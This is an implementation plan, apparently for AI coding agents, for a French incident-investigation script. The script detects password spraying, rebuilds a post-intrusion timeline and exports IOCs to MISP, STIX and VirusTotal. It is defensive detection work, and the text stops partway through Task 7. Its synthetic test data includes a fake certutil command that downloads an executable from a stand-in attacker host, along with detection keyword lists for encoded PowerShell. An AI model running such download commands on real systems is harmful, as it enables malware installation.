# Investigation automatisée en chaîne — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Script Python qui enchaîne détection de password spraying → pivot → chronologie post-intrusion → plan de remédiation → IOC (VirusTotal, MISP, STIX), en expliquant chaque étape en français, et produit un rapport texte + PDF à la charte Formind.

**Architecture:** Étapes = fonctions pures sur des dataclasses dans `investigation.py` ; chaque étape a une fonction `expliquer_*` qui rédige le texte « Recherche / Résultat / -> ». `iocs.py` (extraction + exports), `enrichissement_vt.py` (client VirusTotal) et `rapport_pdf.py` (reportlab, import optionnel) consomment ces structures sans importer `investigation.py` (pas d'import circulaire ; duck typing sur les attributs documentés).

**Tech Stack:** Python 3.14, stdlib (json, datetime, collections, ipaddress, base64, re, uuid, urllib, csv, unittest) ; reportlab 4.4.10 pour le PDF uniquement.

**Spec:** `docs/superpowers/specs/2026-10-06-investigation-chainee-design.md`

Tous les chemins sont relatifs à `/home/ubuntu/Bureau/CTI/Exercice de test/` (le nom contient un espace : toujours citer les chemins). Tests : `python3 -m unittest discover -s tests -v` depuis ce dossier.

## Global Constraints

- Aucune IP, compte, machine, horaire ou nom de tâche du jeu `logs_test.json` dans `investigation.py`, `iocs.py`, `enrichissement_vt.py`, `rapport_pdf.py`.
- Tous les paramètres en tête de `investigation.py` : `FICHIER_LOGS = "logs_test.json"`, `SEUIL_ECHECS = 10`, `SEUIL_COMPTES = 5`, `RESEAUX_INTERNES = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]`, codes `EVT_ECHEC=4625, EVT_SUCCES=4624, EVT_PROCESSUS=4688, EVT_TACHE=4698, EVT_CREATION_COMPTE=4720, EVT_AJOUT_GROUPE=4732, EVT_EFFACEMENT=1102`, `PARENTS_BUREAUTIQUES`, `INTERPRETEURS`, `MARQUEURS_CMD_SUSPECTS`, `GROUPES_PRIVILEGIES`, chemins de sortie, paramètres VT.
- Chemin des logs surchargeable par `argv[1]` ; `--enrichir` active VirusTotal.
- Cœur en stdlib ; pandas non utilisé ; reportlab importé dans un `try/except ImportError`.
- Les 4625 sont identifiés par `event_id`, jamais par `result`.
- « Interne » = IP dans `RESEAUX_INTERNES` (pas `is_private`). Soumission VT seulement si `ipaddress.ip_address(ip).is_global`.
- Textes en français ; blocs `=== ÉTAPE N : TITRE ===` puis lignes `Recherche : `, `Résultat : `, `-> `. Heures `HH:MM` (UTC annoncé dans l'en-tête), `JJ/MM HH:MM` si les données couvrent plusieurs jours.
- VT : clé `VT_API_KEY` (env), cache `cache_vt.json` TTL 24 h, intervalle 15 s, timeout 10 s, 3 essais max, jamais d'upload.

## Review Focus

1. Événements non triés, horodatages `Z`, `+00:00` ou avec fractions de seconde → chargés, convertis en UTC aware et triés (test Task 1).
2. Champs absents, `details: null`, `src_ip` absente → valeurs par défaut, pas de crash (test Task 1).
3. Connexion réussie depuis l'IP suspecte **avant** son premier échec (utilisateur légitime puis attaque) → pas comptée comme compromission (test Task 3).
4. Même IP qui réussit sur plusieurs couples compte/machine → une compromission par couple, une chronologie chacune (test Task 3).
5. Jeu sans aucun 4625 ou sans IP suspecte → chaque étape l'écrit explicitement, rapport généré, code retour 0 (test Task 8).

---

## File Structure

| Fichier | Responsabilité |
|---|---|
| `investigation.py` | paramètres, dataclasses, chargement, étapes 1–4, explications 1–5, gravité, rapport texte, données PDF, `main` |
| `iocs.py` | dataclass `IOC`, extraction, `exporter_misp_csv`, `exporter_stix` |
| `enrichissement_vt.py` | `ClientVT`, `ResultatVT`, `enrichir_iocs` |
| `rapport_pdf.py` | `generer_pdf(chemin, donnees)` |
| `tests/__init__.py` | vide |
| `tests/jeu_synthetique.py` | `construire_jeu() -> list[dict]` (scénario différent du jeu fourni) |
| `tests/test_investigation.py`, `tests/test_iocs.py`, `tests/test_enrichissement_vt.py`, `tests/test_rapport_pdf.py` | tests unittest |
| `NOTES.md`, `sortie_rapport.txt`, `rapport_incident.pdf`, `iocs_misp.csv`, `iocs_stix.json` | livrables générés (Task 10) |

### Jeu synthétique (`tests/jeu_synthetique.py`) — utilisé par toutes les tâches

Date 2026-05-20, UTC. `construire_jeu()` renvoie les dicts au format de `logs_test.json`, **volontairement dans le désordre** (inverser la liste avant de la renvoyer). Helper interne `_evt(ts, event_id, host, account, src_ip=None, logon_type=None, details=None)` avec `result="success"` (reproduit l'incohérence du vrai jeu).

| Bloc | Événements |
|---|---|
| Légitime | 07:55:00 4624 WKS-101 `p.alpha` 10.8.0.11 type 2 ; 09:30:00 4688 WKS-101 `p.alpha` details `{process: chrome.exe, parent_process: explorer.exe, command_line: chrome.exe}` |
| Faux positif | 12 × 4625 SRV-WEB01 `svc_web` 10.8.0.50 type 3, à partir de 08:00:00 toutes les 30 s |
| Spray A (abouti) | 12 × 4625 depuis `198.51.100.23` type 3 sur SRV-FILE02, à partir de 09:00:00 toutes les 40 s, comptes `u.un, u.deux, u.trois, u.quatre, u.cinq, u.six` en boucle (2 chacun) |
| Intrusion | 09:12:00 4624 SRV-FILE02 `u.trois` 198.51.100.23 type 3 |
| | 09:14:00 4688 SRV-FILE02 `u.trois` `{process: cmd.exe, parent_process: excel.exe, command_line: "cmd.exe /c certutil -urlcache -f http://evil.example.net/p.exe C:\\Temp\\p.exe"}` |
| | 09:16:00 4698 SRV-FILE02 `u.trois` `{task_name: "\\OneDriveSyncHelper"}` |
| | 09:18:00 4720 SRV-FILE02 `u.trois` `{new_account: adm_tmp}` |
| | 09:19:00 4732 SRV-FILE02 `u.trois` `{group: "Admins du domaine", member: adm_tmp}` |
| | 09:25:00 4624 WKS-205 `adm_tmp` 10.8.0.77 type 10 |
| | 09:27:00 4688 WKS-205 `adm_tmp` `{process: powershell.exe, parent_process: explorer.exe, command_line: "powershell.exe -enc " + base64(UTF-16LE("Get-Process")), sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}` |
| Spray B (échoué) | 15 × 4625 depuis `192.0.2.88` type 3 sur WKS-110, à partir de 10:00:00 toutes les 30 s, comptes `v.a … v.h` (8) en boucle |
| Force brute | 11 × 4625 depuis `203.0.113.200` type 3 sur SRV-VPN01, compte `administrateur`, à partir de 11:00:00 toutes les 20 s |

Pas de 1102. Constantes exportées : `IP_SPRAY_A`, `IP_SPRAY_B`, `IP_BRUTE`, `IP_FP`, `B64_GET_PROCESS`.

---

### Task 1: Socle — dataclasses, chargement, jeu synthétique

**Files:**
- Create: `investigation.py`, `tests/__init__.py`, `tests/jeu_synthetique.py`, `tests/test_investigation.py`

**Interfaces:**
- Produces (dans `investigation.py`) :
  - tous les paramètres de Global Constraints, plus `PARENTS_BUREAUTIQUES = {"winword.exe","excel.exe","powerpnt.exe","outlook.exe","msaccess.exe","mspub.exe","onenote.exe"}`, `INTERPRETEURS = {"powershell.exe","pwsh.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe"}`, `MARQUEURS_CMD_SUSPECTS = ("-enc", "-encodedcommand", "-nop", "hidden", "downloadstring", "iex")`, `GROUPES_PRIVILEGIES = {"administrateurs","administrators","admins du domaine","domain admins","administrateurs de l'entreprise","enterprise admins","utilisateurs du bureau à distance","remote desktop users"}` (comparaison en minuscules), `SORTIE_TXT="sortie_rapport.txt"`, `SORTIE_PDF="rapport_incident.pdf"`, `SORTIE_MISP="iocs_misp.csv"`, `SORTIE_STIX="iocs_stix.json"`, `VT_CACHE="cache_vt.json"`, `VT_TTL_HEURES=24`, `VT_INTERVALLE_S=15`, `VT_TIMEOUT_S=10`, `VT_MAX_ESSAIS=3`.
  - `@dataclass(frozen=True) Evenement(timestamp: datetime, event_id: int, host: str, account: str, src_ip: str | None, logon_type: int | None, result: str, details: dict)`
  - `class ErreurChargement(Exception)`
  - `parse_ts(texte: str) -> datetime` (UTC aware ; accepte `Z`, `+00:00`, fractions)
  - `charger_logs(chemin: str) -> list[Evenement]` (trié par timestamp ; `details` None → `{}` ; champs absents → `""`/`None`/`0` ; fichier absent ou JSON invalide ou racine non-liste → `ErreurChargement` avec message français ; événement sans timestamp parsable ignoré)

- [ ] **Step 1: Initialiser le dépôt**

```bash
cd "/home/ubuntu/Bureau/CTI/Exercice de test" && git init && printf '__pycache__/\ncache_vt.json\n' > .gitignore
```

- [ ] **Step 2: Écrire `tests/jeu_synthetique.py`** selon la table ci-dessus, et les tests qui échouent dans `tests/test_investigation.py` :

```python
class TestChargement(unittest.TestCase):
    def test_tri_et_formats_horodatage(self):
        # fichier temporaire : 3 événements dans le désordre, formats "…Z", "…+00:00", "…12.5Z"
        evts = charger_logs(chemin)
        self.assertEqual([e.timestamp for e in evts], sorted(e.timestamp for e in evts))
        self.assertEqual(evts[0].timestamp.tzinfo, timezone.utc)
    def test_champs_manquants(self):
        # {"timestamp": "...Z", "event_id": 4625, "details": None} sans host/account/src_ip
        e = charger_logs(chemin)[0]
        self.assertEqual((e.host, e.account, e.src_ip, e.details), ("", "", None, {}))
    def test_fichier_absent(self):
        with self.assertRaises(ErreurChargement): charger_logs("inexistant.json")
    def test_json_invalide(self):
        with self.assertRaises(ErreurChargement): charger_logs(chemin_texte_non_json)
    def test_jeu_synthetique_charge(self):
        self.assertEqual(len(charger_logs(chemin_jeu_synthetique)), 2 + 12 + 12 + 7 + 15 + 11)
```

Helper de test `ecrire_tmp(objets) -> str` (via `tempfile`) partagé par les classes de test.

- [ ] **Step 3: Vérifier l'échec** — `python3 -m unittest tests.test_investigation -v` → FAIL (ImportError).
- [ ] **Step 4: Implémenter** paramètres, `Evenement`, `ErreurChargement`, `parse_ts` (`datetime.fromisoformat` après remplacement de `Z` par `+00:00`, puis `.astimezone(timezone.utc)`), `charger_logs`. En-tête du fichier : docstring expliquant l'usage et les étapes.
- [ ] **Step 5: Vérifier** — même commande → PASS.
- [ ] **Step 6: Commit** — `git add -A && git commit -m "feat: chargement des logs et jeu synthétique"`

---

### Task 2: Étape 1 — détection

**Files:** Modify `investigation.py` ; Test `tests/test_investigation.py`

**Interfaces:**
- Consumes: `Evenement`, paramètres.
- Produces:
  - `@dataclass ProfilIP(ip: str, nb_echecs: int, comptes: list[str], hosts: list[str], debut: datetime, fin: datetime, categorie: str, motif: str)` — `comptes`/`hosts` triés ; `categorie ∈ {"spraying","force_brute","faux_positif_probable","sous_seuil"}`.
  - `@dataclass ResultatDetection(suspectes: list[ProfilIP], ecartees: list[ProfilIP], nb_echecs_total: int, nb_ip_analysees: int, nb_incoherences_result: int)` — `suspectes` triées par `debut` ; `ecartees` = profils non suspects avec `nb_echecs >= SEUIL_ECHECS`.
  - `est_interne(ip: str) -> bool`
  - `etape1_detection(evts: list[Evenement], seuil_echecs: int = SEUIL_ECHECS, seuil_comptes: int = SEUIL_COMPTES) -> ResultatDetection`
  - `formater_heure(dt: datetime, multi_jours: bool) -> str`
  - `expliquer_etape1(det: ResultatDetection, multi_jours: bool) -> str`

- [ ] **Step 1: Tests qui échouent**

```python
class TestEtape1(unittest.TestCase):
    def setUp(self): self.det = etape1_detection(charger_logs(chemin_jeu_synthetique))
    def test_suspectes_et_categories(self):
        self.assertEqual([(p.ip, p.categorie, p.nb_echecs, len(p.comptes)) for p in self.det.suspectes],
            [(IP_SPRAY_A,"spraying",12,6),(IP_SPRAY_B,"spraying",15,8),(IP_BRUTE,"force_brute",11,1)])
    def test_faux_positif_ecarte(self):
        self.assertEqual([(p.ip, p.categorie) for p in self.det.ecartees], [(IP_FP,"faux_positif_probable")])
    def test_fenetre(self):
        a = self.det.suspectes[0]
        self.assertEqual((a.debut.strftime("%H:%M:%S"), a.fin.strftime("%H:%M:%S")), ("09:00:00","09:07:20"))
    def test_incoherence_result_comptee(self):
        self.assertEqual(self.det.nb_incoherences_result, 12+12+15+11)
    def test_est_interne(self):
        self.assertTrue(est_interne("10.8.0.50")); self.assertFalse(est_interne("203.0.113.200"))
        self.assertFalse(est_interne("pas-une-ip"))
    def test_seuils_parametrables(self):
        self.assertEqual(etape1_detection(charger_logs(chemin_jeu_synthetique), seuil_echecs=13).suspectes[0].ip, IP_SPRAY_B)
    def test_explication(self):
        t = expliquer_etape1(self.det, multi_jours=False)
        for attendu in ("=== ÉTAPE 1", "Recherche :", "Résultat :", "->", IP_SPRAY_A, "12 échecs", "6 comptes",
                        "09:00", "password spraying", IP_FP, "svc_web", "compte de service"):
            self.assertIn(attendu, t)
    def test_aucune_ip_suspecte(self):
        t = expliquer_etape1(etape1_detection([]), multi_jours=False)
        self.assertIn("Aucune IP", t)
```

- [ ] **Step 2: Vérifier l'échec** — `python3 -m unittest tests.test_investigation -v` → FAIL.
- [ ] **Step 3: Implémenter** : agrégation `defaultdict` sur les `event_id == EVT_ECHEC` avec `src_ip` non nulle ; classification selon la spec §4 étape 1 (ordre : spraying, puis force_brute si non interne, puis faux_positif_probable si interne et 1 compte, sinon sous_seuil) ; `motif` = phrase française expliquant la classe. L'explication mentionne seuils utilisés, chaque IP suspecte (échecs, comptes, machines visées, fenêtre, profil), chaque IP écartée avec motif (« probable compte de service au mot de passe expiré »), la note d'incohérence `result` si > 0, et la transition.
- [ ] **Step 4: Vérifier** → PASS.
- [ ] **Step 5: Commit** — `feat: étape 1 détection statistique`

---

### Task 3: Étape 2 — pivot

**Files:** Modify `investigation.py` ; Test `tests/test_investigation.py`

**Interfaces:**
- Consumes: `ResultatDetection`, `ProfilIP`.
- Produces:
  - `@dataclass Compromission(ip: str, compte: str, host: str, t0: datetime, logon_type: int | None, profil: ProfilIP)`
  - `@dataclass ResultatPivot(compromissions: list[Compromission], non_abouties: list[ProfilIP])` — compromissions triées par `t0`.
  - `etape2_pivot(evts: list[Evenement], det: ResultatDetection) -> ResultatPivot` — 4624 avec `src_ip == profil.ip` et `timestamp >= profil.debut` ; un par couple (compte, host), premier horodatage.
  - `expliquer_etape2(piv: ResultatPivot, multi_jours: bool) -> str`

- [ ] **Step 1: Tests qui échouent**

```python
class TestEtape2(unittest.TestCase):
    def test_compromission_synthetique(self):
        evts = charger_logs(chemin_jeu_synthetique); piv = etape2_pivot(evts, etape1_detection(evts))
        c = piv.compromissions
        self.assertEqual([(x.ip, x.compte, x.host, x.t0.strftime("%H:%M")) for x in c],
                         [(IP_SPRAY_A, "u.trois", "SRV-FILE02", "09:12")])
        self.assertEqual([p.ip for p in piv.non_abouties], [IP_SPRAY_B, IP_BRUTE])
    def test_succes_avant_premier_echec_ignore(self):
        # jeu synthétique + 4624 depuis IP_SPRAY_B à 09:59:00 (avant son premier échec 10:00) → toujours non aboutie
    def test_plusieurs_couples(self):
        # jeu synthétique + 4624 depuis IP_SPRAY_A à 09:13 compte u.un sur SRV-FILE03 → 2 compromissions
    def test_explication(self):
        t = expliquer_etape2(piv, False)
        for attendu in ("=== ÉTAPE 2", "u.trois", "SRV-FILE02", "09:12", "a abouti", IP_SPRAY_B, "n'a pas abouti"):
            self.assertIn(attendu, t)
```

- [ ] **Step 2: Vérifier l'échec** → FAIL.
- [ ] **Step 3: Implémenter** `Compromission`, `ResultatPivot`, `etape2_pivot`, `expliquer_etape2` (cas sans IP suspecte : « rien à pivoter »).
- [ ] **Step 4: Vérifier** → PASS.
- [ ] **Step 5: Commit** — `feat: étape 2 pivot vers les connexions réussies`

---

### Task 4: Étape 3 — chronologie

**Files:** Modify `investigation.py` ; Test `tests/test_investigation.py`

**Interfaces:**
- Consumes: `ResultatPivot`, `Compromission`.
- Produces:
  - `@dataclass EvenementQualifie(evt: Evenement, nature: str, description: str, suspect: bool, commande_decodee: str | None = None)` — `nature ∈ {"connexion_initiale","connexion","mouvement_lateral","processus_suspect","processus_benin","tache_planifiee","creation_compte","ajout_groupe","ajout_groupe_privilegie","effacement_journal","autre"}`.
  - `@dataclass Chronologie(compromission: Compromission, evenements: list[EvenementQualifie], comptes_suivis: list[str])`
  - `decoder_commande(ligne: str) -> str | None` — si un argument suit `-enc`/`-encodedcommand`/`-e` : base64 → UTF-16LE ; échec → `"non décodable"` ; sans paramètre encodé → `None`.
  - `etape3_chronologie(evts: list[Evenement], piv: ResultatPivot) -> list[Chronologie]`
  - `expliquer_etape3(chronos: list[Chronologie], multi_jours: bool) -> str`

Algorithme du périmètre (non déterminé par les signatures) :

```python
suivis = [c.compte]
for e in evts (chronologique, e.timestamp >= c.t0, e.event_id != EVT_ECHEC):
    membre = e.details.get("member") if e.event_id == EVT_AJOUT_GROUPE else None
    if e.host == c.host or e.account in suivis or membre in suivis:
        retenir(e)
        if e.event_id == EVT_CREATION_COMPTE and new_account not in suivis: suivis.append(new_account)
```

4624 : `connexion_initiale` si c'est l'événement t0 de la compromission ; `mouvement_lateral` si `host != c.host` ; sinon `connexion`.

- [ ] **Step 1: Tests qui échouent**

```python
class TestEtape3(unittest.TestCase):
    def test_chronologie_synthetique(self):
        ch = chronos[0]
        self.assertEqual([(q.evt.timestamp.strftime("%H:%M"), q.nature) for q in ch.evenements], [
            ("09:12","connexion_initiale"),("09:14","processus_suspect"),("09:16","tache_planifiee"),
            ("09:18","creation_compte"),("09:19","ajout_groupe_privilegie"),("09:25","mouvement_lateral"),
            ("09:27","processus_suspect")])
        self.assertEqual(ch.comptes_suivis, ["u.trois","adm_tmp"])
        self.assertEqual(ch.evenements[-1].commande_decodee, "Get-Process")
    def test_activite_hors_perimetre_exclue(self):
        # le 4688 chrome.exe de p.alpha sur WKS-101 n'apparaît pas
    def test_processus_benin_sur_host(self):
        # jeu + 4688 SRV-FILE02 u.trois notepad.exe/explorer.exe à 09:20 → nature "processus_benin", suspect False
    def test_decoder_commande(self):
        self.assertEqual(decoder_commande("powershell.exe -nop -w hidden -enc " + B64_GET_PROCESS), "Get-Process")
        self.assertEqual(decoder_commande("powershell -enc %%%"), "non décodable")
        self.assertIsNone(decoder_commande("chrome.exe"))
    def test_explication(self):
        for attendu in ("=== ÉTAPE 3", "SRV-FILE02", "09:12", "excel.exe", "\\OneDriveSyncHelper", "adm_tmp",
                        "Admins du domaine", "WKS-205", "Get-Process"):
            self.assertIn(attendu, expliquer_etape3(chronos, False))
```

- [ ] **Step 2: Vérifier l'échec** → FAIL.
- [ ] **Step 3: Implémenter** `decoder_commande`, `qualifier_evenement(e: Evenement, c: Compromission) -> EvenementQualifie` (règles spec §4 étape 3 ; noms de processus comparés en minuscules sur le basename), `etape3_chronologie`, `expliquer_etape3` (une ligne par événement `HH:MM  HOST  description`, marquée `[!]` si suspect ; cas vide).
- [ ] **Step 4: Vérifier** → PASS.
- [ ] **Step 5: Commit** — `feat: étape 3 chronologie post-compromission`

---

### Task 5: Étape 4 — plan d'action et gravité

**Files:** Modify `investigation.py` ; Test `tests/test_investigation.py`

**Interfaces:**
- Consumes: `ResultatDetection`, `ResultatPivot`, `list[Chronologie]`.
- Produces:
  - `PRIORITES = ("IMMÉDIAT", "COURT TERME", "SUIVI")`
  - `@dataclass(frozen=True) Action(priorite: str, fait: str, action: str)`
  - `etape4_plan(det, piv, chronos) -> list[Action]` — règles de la table spec §4 étape 4, dédoublonnées, triées par priorité puis ordre d'apparition.
  - `evaluer_gravite(piv: ResultatPivot, chronos: list[Chronologie]) -> str` — `"CRITIQUE"` si une chronologie contient `ajout_groupe_privilegie`, `effacement_journal` ou `mouvement_lateral` ; `"ÉLEVÉE"` si compromission ; `"MODÉRÉE"` si IP suspecte sans compromission ; `"FAIBLE"` sinon.
  - `expliquer_etape4(actions: list[Action], gravite: str) -> str`

- [ ] **Step 1: Tests qui échouent**

```python
class TestEtape4(unittest.TestCase):
    def test_actions_attendues(self):
        textes = " | ".join(a.action for a in actions)
        for attendu in ("Bloquer l'IP " + IP_SPRAY_A, "Bloquer l'IP " + IP_SPRAY_B, "Bloquer l'IP " + IP_BRUTE,
                        "Isoler SRV-FILE02", "Réinitialiser le mot de passe de u.trois", "Désactiver le compte adm_tmp",
                        "Retirer adm_tmp du groupe Admins du domaine", "Supprimer la tâche planifiée \\OneDriveSyncHelper",
                        "Isoler WKS-205", "svc_web"):
            self.assertIn(attendu, textes)
    def test_pas_d_action_sans_fait(self):
        self.assertNotIn("journal", " ".join(a.fait + a.action for a in actions).lower())
    def test_journal_efface(self):
        # jeu + 1102 SRV-FILE02 u.trois à 09:30 → une action mentionnant "SIEM", priorité "COURT TERME"
    def test_chaque_action_a_un_fait(self):
        self.assertTrue(all(a.fait and a.priorite in PRIORITES for a in actions))
    def test_dedoublonnage(self):
        self.assertEqual(len(actions), len(set(actions)))
    def test_gravite(self):
        self.assertEqual(evaluer_gravite(piv, chronos), "CRITIQUE")
        self.assertEqual(evaluer_gravite(ResultatPivot([], []), []), "FAIBLE")
    def test_explication(self):
        t = expliquer_etape4(actions, "CRITIQUE")
        self.assertIn("=== ÉTAPE 4", t); self.assertIn("->", t); self.assertIn("CRITIQUE", t)
```

- [ ] **Step 2: Vérifier l'échec** → FAIL.
- [ ] **Step 3: Implémenter.** Libellés d'action exacts (pour les tests) : `"Bloquer l'IP {ip} au pare-feu et au proxy"`, `"Isoler {host} du réseau"`, `"Réinitialiser le mot de passe de {compte} et révoquer ses sessions"`, `"Désactiver le compte {compte}"`, `"Retirer {membre} du groupe {groupe}"`, `"Supprimer la tâche planifiée {nom} sur {host}"`, `"Collecter les preuves sur {host} (mémoire, disque) et analyser la commande : {décodée ou brute}"`, `"Traçabilité locale perdue sur {host} : s'appuyer sur le SIEM central et les sauvegardes"`, `"Isoler {host} du réseau et étendre l'investigation"` (mouvement latéral), `"Surveiller les comptes visés ({n}) et imposer le MFA"` (non aboutie), `"Vérifier le mot de passe du compte de service {compte} sur {hosts}"` (faux positif), `"Revoir la robustesse des mots de passe des {n} comptes visés"` (spraying, SUIVI).
- [ ] **Step 4: Vérifier** → PASS.
- [ ] **Step 5: Commit** — `feat: étape 4 plan d'action conditionnel`

---

### Task 6: IOC — extraction et exports MISP / STIX

**Files:** Create `iocs.py`, `tests/test_iocs.py`

**Interfaces:**
- Consumes (duck typing, sans import d'`investigation`) : `det.suspectes[*].ip`, `piv.compromissions[*].(compte, host)`, `chronos[*].evenements[*].(nature, evt.details, evt.host, commande_decodee)`.
- Produces:
  - `@dataclass IOC(valeur: str, type_misp: str, categorie_misp: str, to_ids: bool, commentaire: str, statut_enrichissement: str | None = None, enrichissement: dict | None = None)`
  - `extraire_motifs(texte: str) -> list[tuple[str, str]]` — `(type_misp, valeur)` pour md5/sha1/sha256 (hex 32/40/64, bornes `\b`), url (`https?://[^\s"']+`), domain (FQDN dont le TLD alphabétique n'est pas dans `EXTENSIONS_FICHIERS = {"exe","dll","ps1","bat","cmd","vbs","js","hta","txt","dat","tmp","log","lnk","zip","msi","doc","docx","xls","xlsx","ppt","pptx","pdf","sys"}`), ip-dst (IPv4 valide).
  - `extraire_iocs(det, piv, chronos) -> list[IOC]` — mapping de la table spec §4 étape 5 ; motifs cherchés dans toutes les valeurs texte des `details` des événements de chronologie et dans les `commande_decodee` ; dédoublonnage `(type_misp, valeur)`, premier commentaire conservé.
  - `exporter_misp_csv(iocs: list[IOC], chemin: str) -> None` — en-tête `value,type,category,to_ids,comment`, `to_ids` en `1`/`0`, `comment` = commentaire + `" | VT : …"` si enrichi.
  - `exporter_stix(iocs: list[IOC], chemin: str, genere_le: datetime, valide_depuis: datetime) -> dict` — renvoie et écrit le bundle (indent 2, UTF-8).

STIX : `NAMESPACE_STIX = uuid.uuid5(uuid.NAMESPACE_URL, "forcert-investigation-automatisee")` ; `id = f"{type}--{uuid5(NAMESPACE_STIX, cle)}"`. Patterns : `[ipv4-addr:value = 'v']`, `[domain-name:value = 'v']`, `[url:value = 'v']`, `[file:hashes.MD5 = 'v']`, `[file:hashes.'SHA-1' = 'v']`, `[file:hashes.'SHA-256' = 'v']`. `user-account` (`user_id`) pour `target-user` et les comptes créés. `report` : `name = "Incident - investigation automatisée"`, `report_types = ["incident"]`, `published`, `object_refs` = tous les autres objets sauf `identity` ; id dérivé des clés triées de tous les IOC. Tous les SDO portent `spec_version: "2.1"`, `created`/`modified` = `genere_le`, `created_by_ref` = identity.

- [ ] **Step 1: Tests qui échouent**

```python
class TestIOC(unittest.TestCase):
    def test_extraction_synthetique(self):
        paires = {(i.type_misp, i.valeur) for i in iocs}
        for attendu in (("ip-src", IP_SPRAY_A), ("ip-src", IP_BRUTE), ("target-user", "u.trois"),
                        ("target-machine", "SRV-FILE02"), ("target-machine", "WKS-205"),
                        ("text", "adm_tmp"), ("text", "\\OneDriveSyncHelper"),
                        ("url", "http://evil.example.net/p.exe"), ("domain", "evil.example.net"),
                        ("sha256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")):
            self.assertIn(attendu, paires)
    def test_pas_de_faux_domaine(self):
        self.assertEqual([t for t, _ in extraire_motifs("powershell.exe -nop C:\\Temp\\p.exe")], [])
    def test_dedoublonnage(self): self.assertEqual(len(iocs), len({(i.type_misp, i.valeur) for i in iocs}))
    def test_csv_misp(self):
        lignes = list(csv.reader(open(chemin)))
        self.assertEqual(lignes[0], ["value","type","category","to_ids","comment"])
        self.assertIn([IP_SPRAY_A, "ip-src", "Network activity", "1"], [l[:4] for l in lignes[1:]])
    def test_stix(self):
        b = exporter_stix(iocs, chemin, genere_le, valide_depuis)
        self.assertEqual(b["type"], "bundle")
        rapport = [o for o in b["objects"] if o["type"] == "report"][0]
        ids = {o["id"] for o in b["objects"]}
        self.assertTrue(set(rapport["object_refs"]) <= ids)
        self.assertIn(f"[ipv4-addr:value = '{IP_SPRAY_A}']", {o.get("pattern") for o in b["objects"]})
    def test_stix_ids_stables(self):
        self.assertEqual({o["id"] for o in b1["objects"]}, {o["id"] for o in b2["objects"]})  # deux appels
```

- [ ] **Step 2: Vérifier l'échec** — `python3 -m unittest tests.test_iocs -v` → FAIL.
- [ ] **Step 3: Implémenter `iocs.py`.**
- [ ] **Step 4: Vérifier** → PASS.
- [ ] **Step 5: Valider le mapping MISP** — `curl -s https://raw.githubusercontent.com/MISP/MISP/2.4/describeTypes.json` puis vérifier en Python que chaque couple `(type, category)` produit est dans `result.category_type_mappings[category]`. Si un couple est refusé, le remplacer par un couple valide, mettre à jour test + table de la spec, et le noter dans NOTES.md.
- [ ] **Step 6: Commit** — `feat: extraction des IOC et exports MISP/STIX`

---

### Task 7: Enrichissement VirusTotal

**Files:** Create `enrichissement_vt.py`, `tests/test_enrichissement_vt.py`

**Interfaces:**
- Consumes: `IOC` (attributs `type_misp`, `valeur`, `statut_enrichissement`, `enrichissement`).
- Produces:
  - `@dataclass ResultatVT(statut: str, donnees: dict | None = None, message: str = "")` — `statut ∈ {"ok","inconnu","non_soumis","non_applicable","cle_absente","cle_invalide","indisponible"}`.
  - `TYPES_VT = {"ip-src":"ip_addresses","ip-dst":"ip_addresses","domain":"domains","url":"urls","md5":"files","sha1":"files","sha256":"files"}`
  - `class ClientVT(cle: str | None, chemin_cache: str, ttl_heures: float = 24, intervalle_s: float = 15, timeout_s: float = 10, max_essais: int = 3, urlopen=urllib.request.urlopen, horloge=time.time, dormir=time.sleep)` avec `consulter(type_misp: str, valeur: str) -> ResultatVT`.
  - `enrichir_iocs(iocs: list, client: ClientVT) -> dict[str, int]` — remplit `statut_enrichissement`/`enrichissement`, renvoie le comptage par statut.

Comportement : type hors `TYPES_VT` → `non_applicable` ; IP non `is_global` → `non_soumis` avec message (`"plage de documentation RFC 5737"` si dans 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, sinon `"adresse non routable"`) sans HTTP ; clé absente → `cle_absente` sans HTTP ; cache valide → résultat sans HTTP ni attente ; avant chaque requête réelle, `dormir(intervalle - écoulé)` si nécessaire ; 200 → `ok`, données = `last_analysis_stats` (malicious, suspicious, harmless, undetected) + `reputation`, `country`, `as_owner`, `last_analysis_date` ; 404 → `inconnu` ; 429 → `dormir(intervalle * 2**essai)` puis retry jusqu'à `max_essais`, puis `indisponible` ; 401/403 → `cle_invalide`, le client se désactive (appels suivants : `cle_invalide` sans HTTP) ; `URLError`/`TimeoutError` → `indisponible`. Cache : JSON `{"type:valeur": {"horodatage": float, "statut": str, "donnees": dict|None}}`, seuls `ok` et `inconnu` stockés, écrit après chaque ajout ; cache illisible → repart vide. URL id = `base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")`. En-tête `x-apikey`. GET uniquement.

- [ ] **Step 1: Tests qui échouent** (faux `urlopen` qui enregistre les appels et renvoie une suite de réponses ; `urllib.error.HTTPError(url, code, msg, hdrs, None)` pour les erreurs ; fausse horloge + `dormir` qui enregistre les durées)

```python
class TestClientVT(unittest.TestCase):
    def test_succes(self):       # 200 JSON {"data":{"attributes":{"last_analysis_stats":{"malicious":3,...},"country":"NL",...}}}
        r = client.consulter("ip-src", "8.8.4.4"); self.assertEqual((r.statut, r.donnees["malicious"]), ("ok", 3))
        self.assertIn("/ip_addresses/8.8.4.4", appels[0].full_url); self.assertEqual(appels[0].get_method(), "GET")
    def test_inconnu_404(self):  self.assertEqual(statut, "inconnu")
    def test_429_puis_succes(self): self.assertEqual((statut, len(appels)), ("ok", 2))
    def test_429_persistant(self): self.assertEqual((statut, len(appels)), ("indisponible", 3))
    def test_401_desactive(self): # 2 consultations, 1 seul appel HTTP, deux "cle_invalide"
    def test_timeout(self):     self.assertEqual(statut, "indisponible")
    def test_cle_absente(self): self.assertEqual((statut, len(appels)), ("cle_absente", 0))
    def test_rfc5737_non_soumise(self):
        r = client.consulter("ip-src", "203.0.113.200")
        self.assertEqual((r.statut, len(appels)), ("non_soumis", 0)); self.assertIn("RFC 5737", r.message)
    def test_cache(self):       # 2 consultations même valeur → 1 appel ; nouveau ClientVT sur le même fichier → 0 appel
    def test_cache_expire(self): # horloge avancée de 25 h → nouvel appel
